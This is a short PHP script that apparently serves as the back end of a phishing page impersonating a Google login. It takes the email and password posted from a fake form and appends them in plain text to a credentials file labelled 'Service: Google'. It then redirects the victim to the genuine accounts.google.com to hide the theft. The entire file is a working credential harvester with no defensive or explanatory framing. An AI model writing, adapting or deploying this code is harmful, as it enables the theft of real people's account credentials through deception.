<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];
    
    $file = fopen("../../auth/usernames.dat", "a");
    fwrite($file, "Service: Google | Email: " . $email . " | Pass: " . $password . "\n");
    fclose($file);
    
    header("Location: https://accounts.google.com");
    exit();
}
?>
